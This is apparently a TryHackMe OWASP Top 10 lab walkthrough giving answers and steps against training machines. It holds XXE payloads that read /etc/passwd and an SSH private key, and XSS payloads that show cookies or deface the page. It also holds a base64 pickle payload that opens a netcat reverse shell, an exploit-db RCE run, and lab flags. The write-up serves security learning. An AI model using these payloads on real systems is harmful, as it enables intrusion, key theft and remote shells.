# THM - OWASP Top 10

<br>

## Task 5

http://10.10.29.241/evilshell.php

### Task 5.1

```shell
whoami
pwd
ls
```

> drpepper.txt

### Task 5.2

```shell
cat /etc/passwd
```

> 0

### Task 5.3

```shell
whoami
```

> www-data

### Task 5.4

```shell
cat /etc/passwd
```

> /usr/sbin/nologin

### Task 5.5

🧰 https://www.ionos.com/digitalguide/server/know-how/check-ubuntu-version/#:~:text=Open%20the%20terminal%20using%20%E2%80%9CShow,Description%E2%80%9D%20and%20%E2%80%9CRelease%E2%80%9D.

```shell
lsb_release -a
```

> 18.04.4

### Task 5.6

🧰 https://www.systranbox.com/what-is-motd-file-in-linux/

```shell
cat /etc/update-motd.d/00-header
```

> DR PEPPER

<br>

## Task 7

http://10.10.53.111:8888/

### Task 7.1

Register username: " darren"

> fe86079416a21a3c99937fea8874b667

### Task 7.3

Register username: " arthur"

> d9ac0f7db4fda460ac3edeb75d75e16e

<br>

## Task 11

http://10.10.80.48/

### Task 11.1

> /assets

### Task 11.2

http://10.10.80.48/assets/

> webapp.db

### Task 11.3

```shell
sqlite3 webapp.db
	.tables
	PRAGMA table_info(users);
	SELECT * FROM users;
```

> 6eea9b7ef19179a06954edd0f6c05ceb

### Task 11.4

🧰 https://crackstation.net/

> qwertyuiop

### Task 11.5

http://10.10.80.48/login/

http://10.10.80.48/console/

> THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

<br>

## Task 13

### Task 13.1

> Extensible Markup Language

### Task 13.2

> no

### Task 13.3

> yes

### Task 13.4

> XML prolog

<br>

## Task 14

### Task 14.1

> !ELEMENT

### Task 14.2

> !DOCTYPE

### Task 14.3

> !ENTITY

<br>

## Task 16

http://10.10.61.146/

```xml
<!--?xml version="1.0" encoding="UTF-8"?-->
<thm>
 <name>DFTF@PConsole#</name>
</thm>
```

```xml
<!--?xml version="1.0" encoding="UTF-8"?-->
<!DOCTYPE thm [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<thm>
 <name>&read;</name>
</thm>
```

### Task 16.3

> falcon

### Task 16.4

> file:///home/falcon/.ssh/id_rsa

### Task 16.5

```xml
<!--?xml version="1.0" encoding="UTF-8"?-->
<!DOCTYPE thm [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<thm>
 <name>&read;</name>
</thm>
```

> MIIEogIBAAKCAQEA7b

<br>

## Task 18

http://10.10.90.25/

Username: noot

Password: test1234

### Task 18.3

http://10.10.90.25/note.php?note=0

> flag{fivefourthree}

<br>

## Task 19

http://10.10.60.147/

### Task 19.2

🧰 https://github.com/NinjaJc01/PensiveNotes

Username: pensive

Password: PensiveNotes

> thm{4b9513968fd564a87b28aa1f9d672e17}

<br>

## Task 20

http://10.10.23.151/

### Task 20.2

http://10.10.23.151/reflected?keyword=

```html
<script>alert("Hello")</script>
```

> ThereIsMoreToXSSThanYouThink

### Task 20.3

```html
<script>alert(window.location.host)</script>
```

> ReflectiveXss4TheWin

### Task 20.4

http://10.10.23.151/stored

```html
<p>DFTF@PConsole#</p>
```

> HTML_T4gs

### Task 20.5

```html
<script>alert(document.cookie)</script>
```

> W3LL_D0N3_LVL2

### Task 20.6

```html
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
```

> websites_can_be_easily_defaced_with_xss

<br>

## Task 21

### Task 21.1

> The Apache Software Foundation

### Task 21.2

> Denial of Service

<br>

## Task 22

### Task 22.1

> A Behaviour

<br>

## Task 23

### Task 23.1

> Binary

<br>

## Task 24

### Task 24.1

> webapp.com/login

### Task 24.2

> HTTPS

<br>

## Task 25

http://10.10.142.45

### Task 25.1

http://10.10.142.45/register

http://10.10.142.45/myprofile

```shell
echo gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAANTE3ZGEwOWUzYjU1NGYyYThmMjE3N2YzYzkwNjdjMDhxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg== | base64 -d
```

> THM{good_old_base64_huh}

### Task 25.2

```text
(Firefox Developer: Inspect->Storage->Cookies)
userType:"admin"
```

http://10.10.142.45/admin

> THM{heres_the_admin_flag} 

<br>

## Task 26

```text
(Firefox Developer: Inspect->Storage->Cookies)
userType:"user"
```

http://10.10.142.45/myprofile

### Task 26.1

```shell
python3 pickleme.py
```

Output:
```base64
gASVdAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFlybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTAuMTExLjUgOTg3NiA+IC90bXAvZpSFlFKULg==
```

```shell
nc -lvnp 9876
```

```text
(Firefox Developer: Inspect->Storage->Cookies)
encodedPayload:"gASVdAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFlybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuMTAuMTExLjUgOTg3NiA+IC90bXAvZpSFlFKULg=="
```

http://10.10.142.45/feedback

```shell
cd ..
cat flag.txt
```

> 4a69a7ff9fd68

<br>

## Task 29

http://10.10.247.34/

### Task 29.1

🧰 https://www.exploit-db.com/

Search: book store

🧰 https://www.exploit-db.com/exploits/47887

```shell
python3 47887.py http://10.10.247.34/
	wc -c /etc/passwd
```

> 1611

<br>

## Task 30

### Task 30.1

> 49.99.13.16

### Task 30.2

> brute force



